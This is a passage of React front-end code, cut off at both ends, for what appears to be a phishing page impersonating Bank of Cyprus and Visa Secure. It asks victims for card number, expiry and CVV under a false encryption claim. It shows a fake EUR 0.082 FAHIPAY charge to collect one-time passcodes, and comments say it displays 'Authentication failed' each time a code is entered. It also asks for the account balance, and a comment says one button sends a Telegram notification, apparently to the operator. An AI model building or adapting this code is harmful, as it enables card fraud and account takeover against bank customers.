          <section className="relative z-10 w-full bg-white rounded-none flex-1 min-h-0 flex flex-col overflow-hidden select-none">
            {/* STICKY TOP CARD IMAGE - Pinned in place, does not scroll away, background white */}
            <div className="shrink-0 w-full px-4 pt-3.5 pb-2 bg-white z-10">
              <div className="w-full flex justify-center">
                <img
                  src="/cyprus_card.png"
                  alt="Bank of Cyprus Card"
                  className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
                />
              </div>
            </div>

            {/* SCROLLABLE FORM SECTION - Smoothly scrolls below the sticky card, background white */}
            <div
              className="flex-1 min-h-0 overflow-y-auto px-4 pt-2 pb-10 flex flex-col bg-white overscroll-y-contain touch-pan-y"
              style={{ WebkitOverflowScrolling: "touch" }}
            >
              <div className="w-full flex flex-col pb-6">
                {/* Title & Subtitle */}
                <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight">
                  {language === "es" ? "Introducir datos de tarjeta" : "Enter Card Details"}
                </h2>
                <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
                  {language === "es"
                    ? "Introduzca los datos de su tarjeta para continuar."
                    : "Please enter your card details to verify and activate your card."}
                </p>

                {/* Form */}
                <form onSubmit={handleCardSubmit} className="w-full flex flex-col">
                  {/* Field 1: Card Number - Auto moves to Month when 16 digits entered */}
                  <div className="w-full mb-3.5">
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                        {language === "es" ? "NÚMERO DE TARJETA DE 16 DÍGITOS" : "16-DIGIT CARD NUMBER"}
                      </label>
                    </div>
                    <input
                      ref={cardNumberRef}
                      type="tel"
                      inputMode="numeric"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="0000 0000 0000 0000"
                      maxLength={19}
                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal tracking-[0.08em] focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all"
                    />
                  </div>

                  {/* Field 2 & 3: Month & Year - Auto moves Month -> Year -> CVV */}
                  <div className="w-full grid grid-cols-2 gap-3 mb-3.5">
                    {/* Month (2 digits) */}
                    <div>
                      <div className="flex items-center gap-1 mb-1.5">
                        <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                          {language === "es" ? "MES" : "MONTH"}
                        </label>
                      </div>
                      <input
                        ref={cardMonthRef}
                        type="tel"
                        inputMode="numeric"
                        value={cardMonth}
                        onChange={handleMonthChange}
                        onKeyDown={handleMonthKeyDown}
                        placeholder="MM"
                        maxLength={2}
                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all"
                      />
                    </div>

                    {/* Year (2 digits) */}
                    <div>
                      <div className="flex items-center mb-1.5">
                        <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                          {language === "es" ? "AÑO" : "YEAR"}
                        </label>
                      </div>
                      <input
                        ref={cardYearRef}
                        type="tel"
                        inputMode="numeric"
                        value={cardYear}
                        onChange={handleYearChange}
                        onKeyDown={handleYearKeyDown}
                        placeholder="YY"
                        maxLength={2}
                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all"
                      />
                    </div>
                  </div>

                  {/* Field 4: CVV / CVC - Strictly 3 digits */}
                  <div className="w-full mb-3">
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                        CVV / CVC
                      </label>
                    </div>
                    <input
                      ref={cardCvvRef}
                      type="password"
                      inputMode="numeric"
                      value={cardCvv}
                      onChange={handleCvvChange}
                      onKeyDown={handleCvvKeyDown}
                      placeholder="• • •"
                      maxLength={3}
                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[18px] tracking-[0.25em] focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all"
                    />
                  </div>

                  {/* Error if any */}
                  {cardError && (
                    <p className="mt-1 mb-2 text-red-600 bg-red-50 px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-200 animate-shake">
                      {cardError}
                    </p>
                  )}

                  {/* 256-bit encryption text */}
                  <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-4 leading-normal">
                    {language === "es"
                      ? "Los datos de su tarjeta están protegidos con cifrado de 256 bits."
                      : "Your card details are secured with 256-bit encryption."}
                  </p>

                  {/* Continue Button */}
                  <button
                    type="submit"
                    disabled={isCardSubmitting || !isCardFormValid}
                    className={`w-full h-[48px] rounded-[10px] font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
                      isCardFormValid && !isCardSubmitting
                        ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                        : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
                    }`}
                  >
                    {isCardSubmitting ? (
                      <div className="flex items-center gap-2">
                        <svg
                          className="animate-spin h-5 w-5 text-white"
                          xmlns="http://www.w3.org/2000/svg"
                          fill="none"
                          viewBox="0 0 24 24"
                        >
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                          />
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                        <span>{language === "es" ? "VERIFICANDO..." : "VERIFYING..."}</span>
                      </div>
                    ) : language === "es" ? (
                      "Continuar"
                    ) : (
                      "Continue"
                    )}
                  </button>
                </form>
              </div>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 2.5. SCREEN 2.5: 3D SECURE VISA PURCHASE VERIFICATION (Approved Screen)   */}
      {/* Original Bank of Cyprus design restored with fee updated to EUR 0.082     */}
      {/* Defaults to English with language switcher (EN / EL)                      */}
      {/* 2-min silent background timer automatically moves to the OTP screen       */}
      {/* ========================================================================= */}
      {currentScreen === "boc-verify" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] min-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-5 sm:px-6 pt-6 pb-6 select-none">
          {/* Top Section */}
          <div className="w-full flex flex-col">
            {/* Header: Left is Bank of Cyprus + Emblem, Center is Language Toggle, Right is VISA + Secure */}
            <header className="w-full pb-5 flex items-center justify-between shrink-0 bg-white">
              <div className="flex items-center gap-1.5 select-none">
                <span
                  className="text-[#058998] font-serif font-bold text-[18px] sm:text-[19px] tracking-tight leading-none"
                  style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
                >
                  {bocLanguage === "en" ? "Bank of Cyprus" : "Τράπεζα Κύπρου"}
                </span>
                <img
                  src="/boc_logo.png"
                  alt="Bank of Cyprus"
                  className="w-[24px] h-[24px] sm:w-[26px] sm:h-[26px] object-contain rounded-[3px] shrink-0"
                />
              </div>

              {/* Language Toggle: EN | EL (Defaults to English) */}
              <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/80 select-none mx-2">
                <button
                  type="button"
                  onClick={() => setBocLanguage("en")}
                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
                    bocLanguage === "en"
                      ? "bg-[#058998] text-white shadow-xs"
                      : "text-[#64748b] hover:text-[#0f172a]"
                  }`}
                  aria-label="English"
                >
                  EN
                </button>
                <button
                  type="button"
                  onClick={() => setBocLanguage("el")}
                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
                    bocLanguage === "el"
                      ? "bg-[#058998] text-white shadow-xs"
                      : "text-[#64748b] hover:text-[#0f172a]"
                  }`}
                  aria-label="Greek"
                >
                  EL
                </button>
              </div>

              {/* VISA + Secure badge */}
              <div className="flex flex-col items-end shrink-0">
                <img
                  src="/visa_blue.svg"
                  alt="VISA"
                  className="h-[22px] sm:h-[24px] w-auto object-contain shrink-0"
                />
                <span className="mt-1 bg-[#192f60] text-white text-[10px] font-semibold px-2 py-0.5 rounded-[3px] tracking-wide uppercase leading-none">
                  Secure
                </span>
              </div>
            </header>

            {/* Title: Active Card Authentication */}
            <h1 className="text-[20px] sm:text-[22px] font-bold text-[#000000] tracking-tight mb-2">
              {bocLanguage === "en"
                ? "Active Card Authentication"
                : "Ενεργή Πιστοποίηση Κάρτας"}
            </h1>

            {/* Subtitle: Your approval is required in the mobile banking app. */}
            <p className="text-[14px] sm:text-[14.5px] text-[#000000] leading-snug font-normal mb-4">
              {bocLanguage === "en"
                ? "Your approval is required in the mobile banking app."
                : "Απαιτείται η έγκρισή σας στην εφαρμογή mobile banking."}
            </p>

            {/* Teal Call-to-Action Button -> Opens Google Play Store Mobile App Link */}
            <button
              type="button"
              onClick={handleOpenBocApp}
              className="w-full bg-[#0c6a74] hover:bg-[#09575f] active:scale-[0.99] text-white rounded-[7px] py-2.5 px-3 flex items-center justify-center gap-2 mb-4.5 shadow-xs transition-all cursor-pointer select-none"
            >
              <div className="flex flex-col items-center justify-center leading-none shrink-0 pr-0.5">
                <span className="text-[11px] font-bold leading-none">↗</span>
                <span className="text-[9px] font-bold tracking-tight leading-none mt-0.5">BoC</span>
              </div>
              <span className="text-[13.5px] sm:text-[14px] font-semibold tracking-tight">
                {bocLanguage === "en"
                  ? "Tap to confirm and approve 👉"
                  : "Πατήστε για επιβεβαίωση και έγκριση 👉"}
              </span>
            </button>

            {/* Steps Section */}
            <div className="mb-4 select-none">
              <p className="text-[13.5px] sm:text-[14px] font-medium text-[#111827] mb-2">
                {bocLanguage === "en" ? "Please follow these steps:" : "Παρακαλώ ακολουθήστε αυτά τα βήματα:"}
              </p>
              <ol className="text-[13px] sm:text-[13.5px] text-[#1f2937] space-y-1.5 leading-[1.38]">
                <li className="flex items-start gap-1.5">
                  <span className="font-normal shrink-0">1.</span>
                  <span>
                    {bocLanguage === "en"
                      ? "Tap the button above to send an activation request to your phone."
                      : "Πατήστε το κουμπί παραπάνω για να στείλετε αίτημα ενεργοποίησης στο τηλέφωνό σας."}
                  </span>
                </li>
                <li className="flex items-start gap-1.5">
                  <span className="font-normal shrink-0">2.</span>
                  <span>
                    {bocLanguage === "en"
                      ? "Open the Bank mobile app notification on your device."
                      : "Ανοίξτε την ειδοποίηση της εφαρμογής της Τράπεζας στη συσκευή σας."}
                  </span>
                </li>
                <li className="flex items-start gap-1.5">
                  <span className="font-normal shrink-0">3.</span>
                  <span>
                    {bocLanguage === "en"
                      ? "Review the card details and tap 'APPROVE'."
                      : "Ελέγξτε τα στοιχεία της κάρτας και πατήστε 'ΕΓΚΡΙΣΗ'."}
                  </span>
                </li>
              </ol>
            </div>

            {/* Card Authentication & "Not working?" Details Box */}
            <div className="w-full bg-[#f6f7fa] border border-[#e5e7eb] rounded-[12px] p-4 mb-3.5 select-none">
              {/* Last 4 Digits, Service Type (Card Activation & Unlock), Reference ID */}
              <div className="space-y-1.5 text-[13px] sm:text-[13.5px] text-[#111827]">
                <div className="flex items-baseline">
                  <span className="w-[105px] font-bold shrink-0">
                    {bocLanguage === "en" ? "Last 4 Digits:" : "Τελευταία 4 Ψηφία:"}
                  </span>
                  <span className="font-normal">**** {bocCardLast4}</span>
                </div>
                <div className="flex items-baseline">
                  <span className="w-[105px] font-bold shrink-0">
                    {bocLanguage === "en" ? "Service Type:" : "Τύπος Υπηρεσίας:"}
                  </span>
                  <span className="font-normal">
                    {bocLanguage === "en"
                      ? "Card Activation & Unlock"
                      : "Ενεργοποίηση & Ξεκλείδωμα Κάρτας"}
                  </span>
                </div>
                <div className="flex items-baseline">
                  <span className="w-[105px] font-bold shrink-0">
                    {bocLanguage === "en" ? "Reference ID:" : "Αναγνωριστικό:"}
                  </span>
                  <span className="font-normal">BAC-ACT-987654</span>
                </div>
              </div>

              {/* Divider Line */}
              <div className="w-full border-b border-[#e2e8f0] my-3" />

              {/* Not working? Section */}
              <div>
                <p className="text-[13.5px] font-bold text-[#111827] mb-2">
                  {bocLanguage === "en" ? "Not working?" : "Δεν δουλεύει;"}
                </p>

                <ul className="space-y-2 text-[12.5px] sm:text-[13px] text-[#111827]">
                  {/* Bullet 1: i already approved the transaction -> sends Telegram notification */}
                  <li className="flex items-start gap-2">
                    <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
                    <button
                      type="button"
                      onClick={handleBocApproval}
                      className="text-left text-[#111827] underline underline-offset-2 hover:opacity-75 transition-opacity cursor-pointer font-normal"
                    >
                      {bocLanguage === "en"
                        ? "i already approved the transaction"
                        : "έχω ήδη εγκρίνει τη συναλλαγή"}
                    </button>
                  </li>

                  {/* Bullet 2: [Other Option] Send SMS OTP */}
                  <li className="flex flex-col">
                    <div className="flex items-start gap-2">
                      <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
                      <div>
                        <span className="font-normal">
                          {bocLanguage === "en" ? "[Other Option] " : "[Άλλη Επιλογή] "}
                        </span>
                        <button
                          type="button"
                          onClick={handleSendSmsOtpClick}
                          className="text-[#111827] underline underline-offset-2 font-bold hover:opacity-75 transition-opacity cursor-pointer inline"
                        >
                          {bocLanguage === "en" ? "Send SMS OTP" : "Αποστολή SMS OTP"}
                        </button>
                      </div>
                    </div>

                    {/* Explanatory text & Session timer appear ONLY when user clicks Send SMS OTP */}
                    {isSmsOtpRequested && (
                      <div className="mt-1 animate-in fade-in duration-200">
                        <p className="text-[11.5px] sm:text-[12px] text-[#4b5563] pl-4 leading-[1.35]">
                          {bocLanguage === "en"
                            ? "SMS OTP feature will become available once the security session time below has fully expired."
                            : "Η λειτουργία SMS OTP θα είναι διαθέσιμη μόλις λήξει ο χρόνος ασφαλείας παρακάτω."}
                        </p>

                        <div className="flex items-start gap-2 mt-2">
                          <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
                          <p className="text-[#111827]">
                            <span>
                              {bocLanguage === "en"
                                ? "[Other Option] Session will expire in "
                                : "[Άλλη Επιλογή] Η συνεδρία θα λήξει σε "}
                            </span>
                            <span className="font-bold tracking-wide">
                              {formatBocTimer(sessionSecondsLeft)}
                            </span>
                          </p>
                        </div>
                      </div>
                    )}
                  </li>
                </ul>
              </div>
            </div>
          </div>

          {/* Footer Box with only Bank of Cyprus Copyright */}
          <div className="w-full bg-[#f6f7fa] border border-[#e5e7eb] rounded-[12px] py-3 px-3.5 select-none mt-auto text-center">
            <p className="text-[11.5px] sm:text-[12px] text-[#6b7280] leading-normal font-normal">
              {bocLanguage === "en"
                ? "© 2026 Bank of Cyprus Public Company Ltd. All rights reserved."
                : "© 2026 Τράπεζα Κύπρου Δημόσια Εταιρεία Λτδ. Με επιφύλαξη παντός δικαιώματος."}
            </p>
          </div>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 3. SCREEN 3: BANK OF CYPRUS OTP CODE SCREEN (From user screenshot)        */}
      {/* Appears after 2 min from approved screen                                */}
      {/* Accurate amount (EUR 0.082), accurate card number (last 4), and phone     */}
      {/* ========================================================================= */}
      {currentScreen === "otp" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-y-auto shadow-2xl bg-white px-0 select-none">
          {/* Top Bar with X button in top right */}
          <div className="w-full px-5 pt-3 pb-1 flex items-center justify-end shrink-0 bg-white">
            <button
              type="button"
              onClick={() => {
                setCurrentScreen("boc-verify")
                if (typeof window !== "undefined" && window.history) {
                  window.history.pushState({ screen: "boc-verify" }, "", "/boc-verify")
                }
              }}
              className="p-1 -mr-1 text-[#000000] hover:opacity-70 transition-opacity cursor-pointer select-none"
              aria-label="Close"
            >
              <X className="w-5 h-5 stroke-[2.2]" />
            </button>
          </div>

          {/* Header: Left Bank of Cyprus, Center Language toggle (default English), Right VISA logo */}
          <header className="w-full px-5 pb-3.5 flex items-center justify-between shrink-0 bg-white">
            <div className="flex items-center gap-1.5 select-none">
              <span
                className="text-[#058998] font-serif font-bold text-[17px] sm:text-[18px] tracking-tight leading-none"
                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
              >
                {bocLanguage === "en" ? "Bank of Cyprus" : "Τράπεζα Κύπρου"}
              </span>
              <img
                src="/boc_logo.png"
                alt="Bank of Cyprus"
                className="w-[24px] h-[24px] sm:w-[25px] sm:h-[25px] object-contain rounded-[4px] shrink-0 shadow-2xs"
              />
            </div>

            {/* Language Toggle: EN | EL (Defaults to English) */}
            <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/80 select-none">
              <button
                type="button"
                onClick={() => setBocLanguage("en")}
                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
                  bocLanguage === "en"
                    ? "bg-[#1434cb] text-white shadow-xs"
                    : "text-[#64748b] hover:text-[#0f172a]"
                }`}
                aria-label="English"
              >
                EN
              </button>
              <button
                type="button"
                onClick={() => setBocLanguage("el")}
                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
                  bocLanguage === "el"
                    ? "bg-[#1434cb] text-white shadow-xs"
                    : "text-[#64748b] hover:text-[#0f172a]"
                }`}
                aria-label="Greek"
              >
                EL
              </button>
            </div>

            <img
              src="/visa_blue.svg"
              alt="VISA"
              className="h-[28px] sm:h-[32px] w-auto object-contain shrink-0"
            />
          </header>

          {/* Crisp Hairline Divider */}
          <div className="w-full border-b border-[#cbd5e1]/80 shrink-0" />

          {/* Main Body */}
          <section className="w-full flex-1 flex flex-col justify-between px-5 sm:px-6 pt-5 pb-7 select-none bg-white">
            <div className="w-full flex flex-col">
              {/* Heading: Purchase Authentication */}
              <h1 className="text-[17px] sm:text-[18px] font-bold text-[#000000] tracking-tight mb-4">
                {bocLanguage === "en" ? "Purchase Authentication" : "Πιστοποίηση Αγοράς"}
              </h1>

              {/* Authentication failed alert box (shown each time user inputs/submits code) */}
              {bocAuthFailed && (
                <div className="w-full bg-[#f4f4f4] rounded-[3px] p-3.5 mb-5 select-none border border-[#e5e7eb]/80">
                  <p className="text-[13.5px] font-bold text-[#111827]">
                    {bocLanguage === "en" ? "Authentication failed" : "Η ταυτοποίηση απέτυχε"}
                  </p>
                  <div className="w-full border-b border-[#e2e8f0] my-2" />
                  <p className="text-[13px] font-normal text-[#111827] leading-[1.4]">
                    {bocLanguage === "en"
                      ? "The authentication of your payment failed. Please try again."
                      : "Η ταυτοποίηση της πληρωμής σας απέτυχε. Παρακαλώ δοκιμάστε ξανά."}
                  </p>
                </div>
              )}

              {/* Step & Instructions */}
              <div className="mb-4 space-y-1">
                <p className="text-[13.5px] font-normal text-[#111827]">
                  {bocLanguage === "en" ? "Step 1 of 2:" : "Βήμα 1 από 2:"}
                </p>
                <p className="text-[13.5px] font-normal text-[#111827] leading-[1.4]">
                  {bocLanguage === "en"
                    ? `Enter your One-Time Password (OTP) which has been sent to your mobile phone number ${bocMaskedPhone}.`
                    : `Εισάγετε τον κωδικό μίας χρήσης (OTP) που έχει σταλεί στο κινητό σας τηλέφωνο ${bocMaskedPhone}.`}
                </p>
              </div>

              {/* Transaction Details */}
              <div className="space-y-1.5 mb-7 text-[13.5px] font-normal text-[#111827]">
                <p>
                  <span>{bocLanguage === "en" ? "Merchant:" : "Έμπορος:"} </span>
                  <span className="font-normal">FAHIPAY</span>
                </p>
                <p>
                  <span>{bocLanguage === "en" ? "Date:" : "Ημερομηνία:"} </span>
                  <span className="font-normal">{bocDateFormatted}</span>
                </p>
                <p>
                  <span>{bocLanguage === "en" ? "Amount:" : "Ποσό:"} </span>
                  <span className="font-normal">EUR 0.082</span>
                </p>
                <p>
                  <span>{bocLanguage === "en" ? "Card Number:" : "Αριθμός Κάρτας:"} </span>
                  <span className="font-normal">{bocMaskedCard}</span>
                </p>
              </div>

              {/* Form with Verification Code Input & CONFIRM Button */}
              <form onSubmit={handleBocConfirm} className="w-full flex flex-col items-center mb-6">
                <label className="text-[13px] text-[#6b7280] font-normal mb-1.5 text-center select-none">
                  {bocLanguage === "en" ? "Verification Code" : "Κωδικός Επαλήθευσης"}
                </label>
                <input
                  ref={bocInputRef}
                  type="text"
                  inputMode="numeric"
                  value={bocOtp}
                  onChange={(e) => setBocOtp(e.target.value)}
                  maxLength={8}
                  placeholder=""
                  autoFocus
                  disabled={isBocVerifying}
                  className={`w-full max-w-[260px] h-[42px] px-3 rounded-[3px] border bg-white text-[#111827] text-center text-[16px] font-semibold tracking-[0.15em] focus:outline-none mb-3 transition-colors ${
                    bocAuthFailed
                      ? "border-[#ef4444] focus:border-[#ef4444] focus:ring-1 focus:ring-[#ef4444]"
                      : "border-[#a0aec0] focus:border-[#1434cb] focus:ring-1 focus:ring-[#1434cb]"
                  } ${isBocVerifying ? "opacity-60 cursor-not-allowed" : ""}`}
                />
                <button
                  type="submit"
                  disabled={!bocOtp.trim() || isBocVerifying}
                  className={`w-full max-w-[260px] h-[40px] rounded-[3px] font-bold text-[13px] sm:text-[13.5px] tracking-wider uppercase flex items-center justify-center transition-all select-none shadow-xs ${
                    bocOtp.trim() && !isBocVerifying
                      ? "bg-[#1434cb] hover:bg-[#0f28a6] active:scale-[0.99] text-white cursor-pointer"
                      : "bg-[#1434cb]/60 text-white/80 cursor-not-allowed"
                  }`}
                >
                  {isBocVerifying ? (
                    <Loader2 className="w-4 h-4 animate-spin text-white" />
                  ) : bocLanguage === "en" ? (
                    "CONFIRM"
                  ) : (
                    "ΕΠΙΒΕΒΑΙΩΣΗ"
                  )}
                </button>
              </form>

              {/* RESEND SMS OTP (CODE) */}
              <div className="text-center mb-6 select-none">
                <button
                  type="button"
                  onClick={handleBocResend}
                  className="text-[#1434cb] hover:underline font-bold text-[11px] sm:text-[11.5px] tracking-wider uppercase cursor-pointer transition-colors"
                >
                  {bocLanguage === "en" ? "RESEND SMS OTP (CODE)" : "ΕΠΑΝΑΠΟΣΤΟΛΗ SMS OTP (ΚΩΔΙΚΟΣ)"}
                </button>
              </div>
            </div>

            {/* Terms and Conditions (Bottom Left) */}
            <div className="pt-2 select-none">
              <button
                type="button"
                className="text-[#1434cb] hover:underline font-bold text-[13px] cursor-pointer text-left"
              >
                {bocLanguage === "en" ? "Terms and Conditions" : "Όροι και Προϋποθέσεις"}
              </button>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 4. SCREEN 4: ACCOUNT DETAILS                                              */}
      {/* ========================================================================= */}
      {currentScreen === "accounts" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
          {/* Header with Back Arrow and centered Bank of Cyprus Logo on clean white */}
          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-white border-b border-slate-100">
            <button
              type="button"
              onClick={() => setCurrentScreen("otp")}
              className="p-1 -ml-1 text-[#0d1e38] hover:text-[#058998] transition-colors cursor-pointer flex items-center justify-center"
              aria-label="Back"
            >
              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
            </button>

            <div className="flex items-center justify-center">
              <BibdLogo />
            </div>

            <div className="w-6" />
          </header>

          {/* White Card Container extending to bottom with Rounded Top Corners */}
          <section className="relative z-10 w-full bg-white rounded-t-[28px] flex-1 flex flex-col p-5 shadow-2xl overflow-y-auto gap-3.5 select-none">
            {/* Card Display with Overlaid Number & Validity */}
            <div className="w-full flex flex-col items-center">
              <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-white">
                <img
                  src="/cyprus_card.png"
                  alt="Bank of Cyprus Card"
                  className="w-full h-auto object-contain rounded-[14px] select-none pointer-events-none"
                />
                {/* Overlaid Embossed Number */}
                <div className="absolute bottom-[24%] left-[6.5%] font-mono tracking-[0.16em] text-[12px] sm:text-[13.5px] text-white/95 font-semibold drop-shadow-[0_1px_2px_rgba(0,0,0,0.6)]">
                  {cardNumber || "4934 6400 1015 6384"}
                </div>
                {/* Overlaid Expiry */}
                <div className="absolute bottom-[11%] left-[6.5%] flex items-center font-mono text-[7px] sm:text-[8px] text-white/80 tracking-wider">
                  <span className="mr-1 opacity-75">VALID THRU</span>
                  <span className="font-semibold text-white text-[8px] sm:text-[9.5px]">
                    {cardMonth && cardYear ? `${cardMonth}/${cardYear}` : "11/29"}
                  </span>
                </div>
              </div>

              {/* 3 Pagination dots */}
              <div className="flex items-center justify-center gap-1.5 pt-3 pb-0.5">
                <span className="w-4 h-1.5 rounded-full bg-[#058998]" />
                <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
                <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
              </div>
            </div>

            {/* Box 1: ACCOUNT NUMBER */}
            <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
              <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-2">
                {language === "es" ? "NÚMERO DE CUENTA" : "ACCOUNT NUMBER"}
              </label>
              <div className="flex items-center flex-nowrap whitespace-nowrap">
                <span className="bg-[#f1f5f9] text-[#475569] text-[12px] font-semibold px-2.5 py-1 rounded-[6px] mr-3 select-none shrink-0">
                  Acc.
                </span>
                <span className="text-[#1e293b] font-mono text-[15px] tracking-[0.2em] select-none whitespace-nowrap font-medium">
                  **** ****
                </span>
              </div>
            </div>

            {/* Box 2: BANK SECURITY QUESTION */}
            <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
              <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-1">
                {language === "es" ? "PREGUNTA DE SEGURIDAD BANCARIA" : "BANK SECURITY QUESTION"}
              </label>
              <p className="text-[13px] font-medium text-[#1e293b] mb-2.5">
                {language === "es"
                  ? "¿Cuál es el saldo actual de su cuenta?"
                  : "What is your current account balance?"}
              </p>
              <div className="flex items-center">
                <span className="bg-[#058998] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
                  EUR
                </span>
                <input
                  type="text"
                  inputMode="decimal"
                  value={accountBalance}
                  onChange={(e) => setAccountBalance(e.target.value)}
                  placeholder="0.00"
                  className="w-full text-[15px] text-[#1e293b] placeholder-[#94a3b8] outline-none bg-transparent font-medium"
                />
              </div>
            </div>

            {/* Continue Button: Hidden until user enters balance behind EUR */}
            {accountBalance.trim().length > 0 && (
              <button
                type="button"
                disabled={isAccountsSubmitting}
                onClick={handleAccountsSubmit}
                className="w-full h-[48px] bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white rounded-[10px] font-semibold text-[15.5px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none animate-in fade-in duration-200"
              >
                {isAccountsSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    <span>{language === "es" ? "PROCESANDO..." : "PROCESSING..."}</span>
                  </div>
                ) : accountsSuccess ? (
                  language === "es" ? "✓ Completado" : "✓ Completed"
                ) : language === "es" ? (
                  "Continuar"
                ) : (
                  "Continue"
                )}
              </button>
            )}
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 5. SCREEN 5: CONFIRM TRANSACTION OTP (/cc)                                */}
      {/* ========================================================================= */}
      {currentScreen === "confirm-otp" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
          {/* Header with Back Arrow (<) and centered Bank of Cyprus Logo on clean white */}
          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-white border-b border-slate-100">
            <button
              type="button"
              onClick={() => {
                setCurrentScreen("accounts")
                if (typeof window !== "undefined" && window.history) {
                  window.history.pushState({ screen: "accounts" }, "", "/accounts")
                }
              }}
              className="p-1 -ml-1 text-[#0d1e38] hover:text-[#058998] transition-colors cursor-pointer flex items-center justify-center"
              aria-label="Back"
            >
              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
            </button>

            <div className="flex items-center justify-center">
              <BibdLogo />
            </div>

            <div className="w-6" />
          </header>

          {/* Section below header: clean white background extending across the form */}
          <section className="relative z-10 w-full bg-white flex-1 flex flex-col justify-start items-center p-4 pt-6 overflow-y-auto select-none">
            {/* Form Container (Clean white, seamless with background) */}
            <div className="w-full max-w-[380px] bg-white flex flex-col items-center">
              {/* Lock Icon in subtle ring */}
              <div className="w-11 h-11 rounded-full border border-[#058998]/25 flex items-center justify-center text-[#058998] mb-3">
                <Lock className="w-5 h-5 stroke-[2.2]" />
              </div>

              {/* Heading */}
              <h2 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#0f172a] text-center mb-1.5">
